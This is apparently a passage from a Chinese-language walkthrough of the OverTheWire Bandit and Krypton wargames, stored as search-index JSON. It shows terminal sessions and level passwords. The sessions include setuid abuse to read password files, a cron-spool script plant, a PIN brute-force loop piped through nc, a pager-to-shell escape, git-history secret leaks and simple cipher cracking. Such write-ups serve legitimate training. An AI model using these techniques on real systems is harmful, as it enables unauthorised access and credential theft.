]-- For your convenience we have installed a few useful tools which you can find in the following locations: * gef (https://github.com/hugsy/gef) in /opt/gef/ * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/ * peda (https://github.com/longld/peda.git) in /opt/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) Both python2 and python3 are installed. --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us on discord or IRC. Enjoy your stay! Byebye ! Connection to bandit.labs.overthewire.org closed.","title":"level18"},{"location":"WarGame/bandit/#level19","text":"\u8fd9\u4e2a\uff0c\u544a\u8bc9\u4e86\u4f60\u6587\u4ef6\u540d\u548c\u4f4d\u7f6e\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bfb\uff0c\u800c\u4e0d\u662f\u94fe\u63a5\u4e00\u4e2abash \u56e0\u6b64\u53ef\u4ee5\u73a9\u513f\u4e00\u4e2a\u9a9a\u64cd\u4f5c \u250c\u2500[Fail][myc@ubuntu22]\u2500[~] \u2514\u2500\u2500\u257c[13:09:29]$ ssh bandit18@bandit.labs.overthewire.org -p 2220 -t cat readme _ _ _ _ | |__ __ _ _ __ __| (_) |_ | '_ \\ / _` | '_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames bandit18@bandit.labs.overthewire.org's password: awhqfNnAbc1naukrpqDYcF95h7HoMTrC Connection to bandit.labs.overthewire.org closed.","title":"level19"},{"location":"WarGame/bandit/#level20","text":"\u5c31\u662f\u8fd0\u884c\u8fd9\u4e2a\u5c0f\u6587\u4ef6 bandit19@bandit:~$ ./bandit20-do --help Usage: env [OPTION]... [-] [NAME=VALUE]... [COMMAND [ARG]...] Set each NAME to VALUE in the environment and run COMMAND. Mandatory arguments to long options are mandatory for short options too. -i, --ignore-environment start with an empty environment -0, --null end each output line with NUL, not newline -u, --unset=NAME remove variable from the environment -C, --chdir=DIR change working directory to DIR -S, --split-string=S process and split S into separate arguments; used to pass multiple arguments on shebang lines --block-signal[=SIG] block delivery of SIG signal(s) to COMMAND --default-signal[=SIG] reset handling of SIG signal(s) to the default --ignore-signal[=SIG] set handling of SIG signals(s) to do nothing --list-signal-handling list non default signal handling to stderr -v, --debug print verbose information for each processing step --help display this help and exit --version output version information and exit A mere - implies -i. If no COMMAND, print the resulting environment. SIG may be a signal name like 'PIPE', or a signal number like '13'. Without SIG, all known signals are included. Multiple signals can be comma-separated. GNU coreutils online help: <https://www.gnu.org/software/coreutils/> Full documentation <https://www.gnu.org/software/coreutils/env> or available locally via: info '(coreutils) env invocation' bandit19@bandit:~$ ./bandit20-do NAME=11020 cat /etc/bandit_pass/bandit20 VxCazJaVykI6W36BkBU0mJTCM8rR95XT bandit19@bandit:~$","title":"level20"},{"location":"WarGame/bandit/#level21","text":"\u76f4\u63a5\u770b\u56fe NvEJF7oVjkddltPSrdKEFOllh9V1IBcq","title":"level21"},{"location":"WarGame/bandit/#level22","text":"\u5c31\u662f\u770b\u5b88\u62a4\u8fdb\u7a0b\u5728\u8fd0\u884c\u54ea\u4e2a\u811a\u672c\uff0c\u7136\u540e\u8ddf\u7740\u53bb\u627e\u3002 bandit21@bandit:~$ man cron bandit21@bandit:~$ man crontab bandit21@bandit:~$ man 5 crontab bandit21@bandit:~$ cd /etc/cron.d/ bandit21@bandit:/etc/cron.d$ ll total 56 drwxr-xr-x 2 root root 4096 Apr 23 18:05 ./ drwxr-xr-x 108 root root 12288 Jun 10 22:51 ../ -rw-r--r-- 1 root root 62 Apr 23 18:04 cronjob_bandit15_root -rw-r--r-- 1 root root 62 Apr 23 18:04 cronjob_bandit17_root -rw-r--r-- 1 root root 120 Apr 23 18:04 cronjob_bandit22 -rw-r--r-- 1 root root 122 Apr 23 18:04 cronjob_bandit23 -rw-r--r-- 1 root root 120 Apr 23 18:04 cronjob_bandit24 -rw-r--r-- 1 root root 62 Apr 23 18:04 cronjob_bandit25_root -rw-r--r-- 1 root root 201 Jan 8 2022 e2scrub_all -rwx------ 1 root root 52 Apr 23 18:05 otw-tmp-dir* -rw-r--r-- 1 root root 102 Mar 23 2022 .placeholder -rw-r--r-- 1 root root 396 Feb 2 2021 sysstat bandit21@bandit:/etc/cron.d$ cat cronjob_bandit15_root * * * * * root /usr/bin/cronjob_bandit15_root.sh &> /dev/null bandit21@bandit:/etc/cron.d$ cat cronjob_bandit17_root * * * * * root /usr/bin/cronjob_bandit17_root.sh &> /dev/null bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22 @reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null * * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh #!/bin/bash chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff bandit21@bandit:/etc/cron.d$","title":"level22"},{"location":"WarGame/bandit/#level23","text":"\u548c\u4e0a\u9762\u90a3\u4e2a\u9898\u51e0\u4e4e\u4e00\u6837 bandit22@bandit:~$ cd /etc/cron.d/ bandit22@bandit:/etc/cron.d$ ll total 56 drwxr-xr-x 2 root root 4096 Apr 23 18:05 ./ drwxr-xr-x 108 root root 12288 Jun 10 22:51 ../ -rw-r--r-- 1 root root 62 Apr 23 18:04 cronjob_bandit15_root -rw-r--r-- 1 root root 62 Apr 23 18:04 cronjob_bandit17_root -rw-r--r-- 1 root root 120 Apr 23 18:04 cronjob_bandit22 -rw-r--r-- 1 root root 122 Apr 23 18:04 cronjob_bandit23 -rw-r--r-- 1 root root 120 Apr 23 18:04 cronjob_bandit24 -rw-r--r-- 1 root root 62 Apr 23 18:04 cronjob_bandit25_root -rw-r--r-- 1 root root 201 Jan 8 2022 e2scrub_all -rwx------ 1 root root 52 Apr 23 18:05 otw-tmp-dir* -rw-r--r-- 1 root root 102 Mar 23 2022 .placeholder -rw-r--r-- 1 root root 396 Feb 2 2021 sysstat bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23 @reboot bandit23 /usr/bin/cronjob_bandit23.sh &> /dev/null * * * * * bandit23 /usr/bin/cronjob_bandit23.sh &> /dev/null bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh #!/bin/bash myname=$(whoami) mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1) echo \"Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\" cat /etc/bandit_pass/$myname > /tmp/$mytarget bandit22@bandit:/etc/cron.d$ \u62ff\u5230\u811a\u672c\u4ee5\u540e\u76f4\u63a5\u6267\u884c\u4e00\u4e0b\uff0c\u4e0d\u8fc7\u9700\u8981\u6ce8\u610f\u7528\u6237\u662fbandit23\uff0c\u56e0\u4e3awhoami\u8f93\u51fa\u7684\u662fbandit22 bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1 8ca319486bfbbc3663ea0fbe81326349 bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349 QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G","title":"level23"},{"location":"WarGame/bandit/#level24","text":"\u8fd8\u662f\u90a3\u51e0\u6b65\uff0c\u7136\u540e\u770b\u5230\u4e86\u8fd9\u73a9\u610f\u513f bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh #!/bin/bash myname=$(whoami) cd /var/spool/$myname/foo || exit 1 echo \"Executing and deleting all scripts in /var/spool/$myname/foo:\" for i in * .*; do if [ \"$i\" != \".\" -a \"$i\" != \"..\" ]; then echo \"Handling $i\" owner=\"$(stat --format \"%U\" ./$i)\" if [ \"${owner}\" = \"bandit23\" ]; then timeout -s 9 60 ./$i fi rm -rf ./$i fi done bandit23@bandit:/var/spool/bandit24$ ll total 12 dr-xr-x--- 3 bandit24 bandit23 4096 Apr 23 18:04 ./ drwxr-xr-x 5 root root 4096 Apr 23 18:04 ../ drwxrwx-wx 13 root bandit24 4096 Jul 17 06:58 foo/ bandit23@bandit:/var/spool/bandit24$ # \u8fd9\u91cc\u6211\u6839\u672c\u6ca1\u6709\u5199\u7684\u6743\u9650\uff0c\u9898\u6539\u4e86\uff1f\uff1f\uff1f\uff1f\uff1f\uff1f\uff1f \u90a3\u4e5f\u7b80\u5355\uff0c\u5c31\u662f\u628a\u811a\u672c\u653e\u5728foo\u5e95\u4e0b \u811a\u672c\u5c31\u662f\u4e00\u4e2a\u8f93\u51fa\uff0c\u6c34\u7684\u4e00\u6279 #!/bin/bash cat /etc/bandit_pass/bandit24 >> /tmp/bandit23/pass \u7136\u540e\u6267\u884c\u811a\u672c\u5c31\u884c\uff0c\u6700\u540e\u5f97\u5230\u5982\u4e0b\u7ed3\u679c\uff1a VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar","title":"level24"},{"location":"WarGame/bandit/#level25","text":"\u8981\u5199\u7206\u7834\u811a\u672c bandit24@bandit:~$ nc localhost 30002 I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. Fail! You did not supply enough data. Try again. ^C bandit24@bandit:~$ \u811a\u672c\u5982\u4e0b\uff1a #! /bin/bash pass24=\"VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar\" for i in {0..9}{0..9}{0..9}{0..9} do echo $pass24' '$i >> mydict done echo \"done loop!\" cat ./mydict | nc localhost 30002 >> re sort re | uniq -u \u4e0a\u8fb9\u513f\u6709\u4e2a\u9898\u8c8c\u4f3c\u5e94\u8be5\u7528-u\u7684\uff0cG \u6700\u540e\u5f97\u5230\u5982\u4e0b\u7ed3\u679c\uff1a The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d","title":"level25"},{"location":"WarGame/bandit/#level26","text":"\u767b\u9646\u4e0a\u4ee5\u540e\u51fa\u73b0\u5982\u4e0b\u5185\u5bb9\uff1a bandit25@bandit:~$ ll total 32 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 70 root root 4096 Apr 23 18:05 ../ -rw-r----- 1 bandit25 bandit25 33 Apr 23 18:04 .bandit24.password -r-------- 1 bandit25 bandit25 1679 Apr 23 18:04 bandit26.sshkey -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -rw-r----- 1 bandit25 bandit25 4 Apr 23 18:04 .pin -rw-r--r-- 1 root root 807 Jan 6 2022 .profile bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost -p 2220 The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Could not create directory '/home/bandit25/.ssh' (Permission denied). Failed to add the host to the list of known hosts (/home/bandit25/.ssh/known_hosts). _ _ _ _ | |__ __ _ _ __ __| (_) |_ | '_ \\ / _` | '_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames !!! You are trying to log into this SSH server with a password on port 2220 from localhost. !!! Connecting from localhost is blocked to conserve resources. !!! Please log out and log in again. ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\ ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\ \\; : . | ' ' ' : `----' | | \\ ; ` | ' ; \\; / | ' : ; . \\ .\\ ; \\ \\ ', / | | ' \\ \\ ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to the #wargames channel on discord or IRC. --[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ is disabled and to /proc restricted so that users cannot snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! The /tmp directory is regularly wiped. Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few useful tools which you can find in the following locations: * gef (https://github.com/hugsy/gef) in /opt/gef/ * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/ * peda (https://github.com/longld/peda.git) in /opt/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) Both python2 and python3 are installed. --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us on discord or IRC. Enjoy your stay! _ _ _ _ ___ __ | | | (_) | |__ \\ / / | |__ __ _ _ __ __| |_| |_ ) / /_ | '_ \\ / _` | '_ \\ / _` | | __| / / '_ \\ | |_) | (_| | | | | (_| | | |_ / /| (_) | |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/ Connection to localhost closed. bandit25@bandit:~$ \u8fd9\u4e00\u6b65\u9700\u8981\u77e5\u9053etc/passwd\u7684\u5185\u5bb9\uff0c\u8fd9\u91cc\u6709\u4e2a \u4e2d\u6587\u535a\u5ba2 bandit25@bandit:~$ cat /etc/passwd | grep \"bandit26\" bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext bandit25@bandit:~$ cat /usr/bin/showtext #!/bin/sh export TERM=linux exec more ~/text.txt exit 0 bandit25@bandit:~$ \u53d1\u73b0\u4f7f\u7528more\u5c55\u793a\uff0c\u8fd9\u91cc\u5c31\u53ef\u4ee5\u628a\u7a97\u53e3\u7f29\u5c0f\uff0c\u8ba9\u4ed6\u4e00\u4e0b\u5b50\u5c55\u793a\u4e0d\u5b8c\u9700\u8981\u7ffb\u9875\u5373\u53ef\uff0c\u7136\u540e\u8fdb\u5165vim\u6a21\u5f0f\u5c31\u53ef\u4ee5\u8fdb\u884c\u641c\u7d22\u554a\u3001\u7f16\u8f91\u554a\u4e4b\u7c7b\u7684\u4e8b\u4e86\uff0c\u5c31\u89e3\u51b3\u4e86\u3002 :r /etc/bandit_pass/bandit26 c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1","title":"level26"},{"location":"WarGame/bandit/#level27","text":"\u8fd9\u4e00\u9898\u548clevel26\u4e00\u6837\uff0c\u8fd8\u5f97\u7f29\u5c0fterminal\uff0c\u8fd9\u4e2a\u4e0d\u4f1a\uff0c\u770b\u7684\u7f51\u4e0a\u7684\u9898\u89e3\u3002 :set shell sh=/bin/sh :sh $ ll /bin/sh: 1: ll: not found $ ls -al total 44 drwxr-xr-x 3 root root 4096 Apr 23 18:04 . drwxr-xr-x 70 root root 4096 Apr 23 18:05 .. -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -rw-r--r-- 1 root root 807 Jan 6 2022 .profile drwxr-xr-x 2 root root 4096 Apr 23 18:04 .ssh -rwsr-x--- 1 bandit27 bandit26 14876 Apr 23 18:04 bandit27-do -rw-r----- 1 bandit26 bandit26 258 Apr 23 18:04 text.txt $ file bandit27-do bandit27-do: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=c148b21f7eb7e816998f07490c8007567e51953f, for GNU/Linux 3.2.0, not stripped $ ./bandit27-do Run a command as another user. Example: ./bandit27-do id $ ./bandit27-do cat /etc/bandit_pass/bandit27 YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS","title":"level27"},{"location":"WarGame/bandit/#level28","text":"\u4f7f\u7528git\u4ed3\u5e93 bandit27@bandit:/tmp/a$ git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo Cloning into 'repo'... The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Could not create directory '/home/bandit27/.ssh' (Permission denied). Failed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts). _ _ _ _ | |__ __ _ _ __ __| (_) |_ | '_ \\ / _` | '_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames bandit27-git@localhost's password: remote: Enumerating objects: 3, done. remote: Counting objects: 100% (3/3), done. remote: Compressing objects: 100% (2/2), done. remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 Receiving objects: 100% (3/3), done. bandit27@bandit:/tmp/a$ ll total 10564 drwxrwxr-x 3 bandit27 bandit27 4096 Jul 19 02:08 ./ drwxrwx-wt 317 root root 10801152 Jul 19 02:08 ../ drwxrwxr-x 3 bandit27 bandit27 4096 Jul 19 02:08 repo/ bandit27@bandit:/tmp/a$ cd repo/ bandit27@bandit:/tmp/a/repo$ ll total 16 drwxrwxr-x 3 bandit27 bandit27 4096 Jul 19 02:08 ./ drwxrwxr-x 3 bandit27 bandit27 4096 Jul 19 02:08 ../ drwxrwxr-x 8 bandit27 bandit27 4096 Jul 19 02:08 .git/ -rw-rw-r-- 1 bandit27 bandit27 68 Jul 19 02:08 README bandit27@bandit:/tmp/a/repo$ cat README The password to the next level is: AVanL161y9rsbcJIsFHuw35rjaOM19nR bandit27@bandit:/tmp/a/repo$","title":"level28"},{"location":"WarGame/bandit/#level29","text":"\u8fd8\u662f\u8001\u89c4\u77e9 bandit28@bandit:/tmp/b$ git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo Cloning into 'repo'... The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Could not create directory '/home/bandit28/.ssh' (Permission denied). Failed to add the host to the list of known hosts (/home/bandit28/.ssh/known_hosts). _ _ _ _ | |__ __ _ _ __ __| (_) |_ | '_ \\ / _` | '_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames bandit28-git@localhost's password: remote: Enumerating objects: 9, done. remote: Counting objects: 100% (9/9), done. remote: Compressing objects: 100% (6/6), done. remote: Total 9 (delta 2), reused 0 (delta 0), pack-reused 0 Receiving objects: 100% (9/9), done. Resolving deltas: 100% (2/2), done. bandit28@bandit:/tmp/b$ cd repo/ bandit28@bandit:/tmp/b/repo$ ll total 16 drwxrwxr-x 3 bandit28 bandit28 4096 Jul 19 02:11 ./ drwxrwxr-x 3 bandit28 bandit28 4096 Jul 19 02:11 ../ drwxrwxr-x 8 bandit28 bandit28 4096 Jul 19 02:11 .git/ -rw-rw-r-- 1 bandit28 bandit28 111 Jul 19 02:11 README.md bandit28@bandit:/tmp/b/repo$ cat README.md # Bandit Notes Some notes for level29 of bandit. ## credentials - username: bandit29 - password: xxxxxxxxxx bandit28@bandit:/tmp/b/repo$ git log commit 899ba88df296331cc01f30d022c006775d467f28 (HEAD -> master, origin/master, origin/HEAD) Author: Morla Porla <morla@overthewire.org> Date: Sun Apr 23 18:04:39 2023 +0000 fix info leak commit abcff758fa6343a0d002a1c0add1ad8c71b88534 Author: Morla Porla <morla@overthewire.org> Date: Sun Apr 23 18:04:39 2023 +0000 add missing data commit c0a8c3cf093fba65f4ee0e1fe2a530b799508c78 Author: Ben Dover <noone@overthewire.org> Date: Sun Apr 23 18:04:39 2023 +0000 initial commit of README.md \u8fd9\u662f\u5178\u578b\u7684git\u6cc4\u9732 bandit28@bandit:/tmp/b/repo$ git diff 899b abcf diff --git a/README.md b/README.md index 5c6457b..b302105 100644 --- a/README.md +++ b/README.md @@ -4,5 +4,5 @@ Some notes for level29 of bandit. ## credentials - username: bandit29 -- password: xxxxxxxxxx +- password: tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S bandit28@bandit:/tmp/b/repo$","title":"level29"},{"location":"WarGame/bandit/#level30","text":"\u4e0b\u8f7d\u4e0b\u6765\u4ee5\u540e\uff0c\u4e00\u5f00\u59cb\u4ee5\u4e3a\u662fstash\uff0c\u7136\u540e\u53d1\u73b0\u4e0d\u662f\uff0c\u90a3\u4e48\u67e5\u770b\u522b\u7684\u5206\u652f\u3002 bandit29@bandit:/tmp/c/repo$ git stash list bandit29@bandit:/tmp/c/repo$ git branch -a * master remotes/origin/HEAD -> origin/master remotes/origin/dev remotes/origin/master remotes/origin/sploits-dev bandit29@bandit:/tmp/c/repo$ \u7136\u540e\u5207\u6362\u5206\u652f\u5373\u53ef bandit29@bandit:/tmp/c/repo$ git checkout dev Branch 'dev' set up to track remote branch 'dev' from 'origin'. Switched to a new branch 'dev' bandit29@bandit:/tmp/c/repo$ cat README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit30 - password: xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS bandit29@bandit:/tmp/c/repo$","title":"level30"},{"location":"WarGame/bandit/#level31","text":"\u8fd9\u4e2a\u4e0d\u4f1a\uff0c\u770b\u4e86\u4e00\u4e0b\u7f51\u4e0a\u7684\u7b54\u6848\uff0c\u8fd9\u73a9\u610f\u513f\u53eb\u5f15\u7528\uff0c\u8fd9\u91cc\u662f Git Pro\u6559\u7a0b bandit30@bandit:/tmp/d/repo$ git show-ref 59530d30d299ff2e3e9719c096ebf46a65cc1424 refs/heads/master 59530d30d299ff2e3e9719c096ebf46a65cc1424 refs/remotes/origin/HEAD 59530d30d299ff2e3e9719c096ebf46a65cc1424 refs/remotes/origin/master 831aac2e2341f009e40e46392a4f5dd318483019 refs/tags/secret bandit30@bandit:/tmp/d/repo$ git show 831a OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt bandit30@bandit:/tmp/d/repo$","title":"level31"},{"location":"WarGame/bandit/#level32","text":"push\u6587\u4ef6 bandit31@bandit:/tmp/d/repo$ git add -f ./key.txt bandit31@bandit:/tmp/d/repo$ git commit -m \"add key.txt\" [master 462b8a5] add key.txt 1 file changed, 1 insertion(+) create mode 100644 key.txt bandit31@bandit:/tmp/d/repo$ git push The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Could not create directory '/home/bandit31/.ssh' (Permission denied). Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts). _ _ _ _ | |__ __ _ _ __ __| (_) |_ | '_ \\ / _` | '_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames bandit31-git@localhost's password: Enumerating objects: 4, done. Counting objects: 100% (4/4), done. Delta compression using up to 2 threads Compressing objects: 100% (2/2), done. Writing objects: 100% (3/3), 324 bytes | 324.00 KiB/s, done. Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 remote: ### Attempting to validate files... #### remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: remote: Well done! Here is the password for the next level: remote: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: To ssh://localhost:2220/home/bandit31-git/repo ! [remote rejected] master -> master (pre-receive hook declined) error: failed to push some refs to 'ssh://localhost:2220/home/bandit31-git/repo' bandit31@bandit:/tmp/d/repo$","title":"level32"},{"location":"WarGame/bandit/#level33","text":"\u8fd9\u4e2a\u4e0d\u4f1a\uff0c\u770b\u7684 \u7b54\u6848 >> $0 $ cat /etc/bandit_pass/bandit33 odHo63fHiFqcWWJG9rLiLDtPm45KzUKy","title":"level33"},{"location":"WarGame/bandit/#_1","text":"bandit33@bandit:~$ cat README.txt Congratulations on solving the last level of this game! At this moment, there are no more levels to play in this game. However, we are constantly working on new levels and will most likely expand this game with more levels soon. Keep an eye out for an announcement on our usual communication channels! In the meantime, you could play some of our other wargames. If you have an idea for an awesome new level, please let us know! bandit33@bandit:~$ \u5b8c\u7ed3\u6492\u82b1","title":"\u5f69\u86cb\u4e86"},{"location":"WarGame/krypton/","text":"level0 base64\u89e3\u7801 S1JZUFRPTklTR1JFQVQ= | | \\|/ KRYPTONISGREAT level1 \u5dee\u70b9\u513f\u6ca1\u627e\u7740\u6587\u4ef6\uff0c\u771f\u62bd\u8c61\u3002 krypton1@bandit:/krypton/krypton1$ ll total 16 drwxr-xr-x 2 root root 4096 Apr 23 18:05 ./ drwxr-xr-x 8 root root 4096 Apr 23 18:05 ../ -rw-r----- 1 krypton1 krypton1 26 Apr 23 18:05 krypton2 -rw-r----- 1 krypton1 krypton1 882 Apr 23 18:05 README krypton1@bandit:/krypton/krypton1$ cat README Welcome to Krypton! This game is intended to give hands on experience with cryptography and cryptanalysis. The levels progress from classic ciphers, to modern, easy to harder. Although there are excellent public tools, like cryptool,to perform the simple analysis, we strongly encourage you to try and do these without them for now. We will use them in later excercises. ** Please try these levels without cryptool first ** The first level is easy. The password for level 2 is in the file 'krypton2'. It is 'encrypted' using a simple rotation called ROT13. It is also in non-standard ciphertext format. When using alpha characters for cipher text it is normal to group the letters into 5 letter clusters, regardless of word boundaries. This helps obfuscate any patterns. This file has kept the plain text word boundaries and carried them to the cipher text. Enjoy! krypton1@bandit:/krypton/krypton1$ cat krypton2 | tr [A-Z] [N-ZA-M] LEVEL TWO PASSWORD ROTTEN krypton1@bandit:/krypton/krypton1$ \u5c31\u4e00\u4e2a\u79fb\u4f4d\u5bc6\u7801 level2 \u8fd8\u662f\u4e00\u4e2a\u79fb\u4f4d\u5bc6\u7801 krypton2@bandit:/tmp/krypton2$ cat /etc/issue Ubuntu 22.04.2 LTS \\n \\l krypton2@bandit:/tmp/krypton2$ /krypton/krypton2/encrypt /etc/issue krypton2@bandit:/tmp/krypton2$ cat ciphertext GNGZFGXFEZXkrypton2@bandit:/tmp/krypton2$ \u56e0\u6b64 krypton2@bandit:/tmp/krypton2$ cat /krypton/krypton2/krypton3 | tr [A-Z] [O-ZA-N] CAESARISEASY krypton2@bandit:/tmp/krypton2$ level3 \u63d0\u793a\u662f\u7edf\u8ba1\uff0c\u90a3\u5c31\u77e5\u9053\u4e86 krypton3@bandit:/krypton/krypton3$ cat found{1..3} | tr -cd '[:alpha:]' | fold -w1 | sort | uniq -c | sort -nr 456 S 340 Q 301 J 257 U 246 B 240 N 227 G 227 C 210 D 132 Z 130 V 129 W 86 M 84 Y 75 T 71 X 67 K 64 E 60 L 55 A 28 F 19 I 12 O 4 R 4 H 2 P \u7136\u540e\u8fd9\u513f\u6709\u4e2a\u8fd9\u73a9\u610f\uff0c\u5927\u6982\u80fd\u770b\u51fa\u6765 \u4f46\u662f\u4e0d\u5b8c\u5168\u51c6\uff0c\u6765\u56de\u8bd5\u8bd5\u57fa\u672c\u4e0a\u5c31\u53ef\u4ee5\u4e86 krypton3@bandit:/krypton/krypton3$ cat krypton4 | tr 'KSVWBDGIXMNYQUCAJ' 'WELDOHNVFURPASIBT' WELLD ONETH ELELE LFOUP RASSW OPDIS XPUTE krypton3@bandit:/krypton/krypton3$ \u6bd4\u5982\u8bf4\u4f60\u731ckrypton\u91cc\u9762\u6709password\uff0c\u7136\u540e\u731c\u4e00\u4e0b\u5c31\u884c\u3002 level4 \u76f4\u63a5\u770bwp\u4e86\u53cd\u6b63\u662f\u3002\u3002\u3002 cleartext \u8fd9\u91cc\u6709\u4e2a\u7834\u89e3\u8fd9\u79cd\u5bc6\u7801\u7684 \u4e2d\u6587\u53c2\u8003 \uff0c\u53ef\u4ee5\u770b\u4e00\u770b level5 \u8fd9\u56de\uff0c\u641c\u4e86\u4e2a\u811a\u672c\u513f\u3002\u3002\u3002 \u81ea\u5df1\u5199\u662f\u771f\u4e0d\u4f1a\u3002\u3002\u3002 \u5f53\u7136\uff0c\u9996\u5148\u9700\u8981\u4e00\u70b9\u70b9\u5c0f\u7684\u547d\u4ee4 cat /krypton/krypton5/found{1..3} | tr -d '[:space:]' > output.txt \u7136\u540e\u8dd1\u811a\u672c ref1 REF2 import string # \u52a0\u8f7d\u5bc6\u6587 with 